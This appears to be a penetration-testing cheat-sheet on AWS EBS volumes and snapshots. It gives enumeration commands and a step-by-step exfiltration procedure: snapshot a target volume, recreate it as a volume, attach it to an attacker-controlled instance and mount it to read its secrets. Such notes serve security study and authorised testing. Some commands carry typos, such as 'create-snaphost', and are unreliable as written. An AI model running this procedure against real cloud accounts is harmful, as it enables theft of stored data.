- `EBS - Elastic Block Service` is a storage service that could be attached to an EC2 instance to persistently store data on it (think of it as attaching a hard-drive to your computer)
- Multiple EBSs can be attached to a single EC2 instance
- an EBS Volume can be created from scratch or can be created from an existing Snapshot. If compromised, an attacker can create a volume from that snapshot, attach it to an EC2 instance and access the files on the snapshot
- `Snaphots`
	- Are Backup of EBS Volume
	- Stored in a non-publicaly accessible S3 bucket
	- Snapshotes can be used as a Volume or as AMIs

### Enumeration

Description | Command
--- | ---
Describe EBS Volums | `aws ec2 describe-volumes`
Describe EBS Snapshots | `aws ec2 describe-snapshots --owner-ids self`

### Data Exfiltration from EBS

- EBS Volume could contain all sorts of secrets but you don't always have a dircet access to that ec2 instance to see its volume
- First start by listing all the instances in your region `aws ec2 describe-instances`, locate the target instanec and find its `VolumeId`
- List the volum's information using `aws ec2 describe-volumes --filters "Name=volume-id,Values=${Vol_Id}"`
- Create a snapshot from the target volume and recored the resulting `Snapshot-Id` using `aws ec2 create-snaphost --volume-id ${Vol-Id} --description "Hacker Snapshot"` (You can use the `Policy Simulator` to confirm whether or not you can perform the snapshot creation action)
- Now create a volume from the snapshot using `aws ec2 create-volume --snapshot-id ${Snap-Id} --availability-zone ${Avail-Zone}`
- Attache the new volume to an ec2 instance that you already have access to using `aws ec2 attach-volume --volume-id ${Vol-Id} --instance-id ${Inst-Id} --device /dev/xvdc` 
- Finally, mount the Volume to on your instance using `sudo mount /dev/xvdc /home/user/MountingLocation`
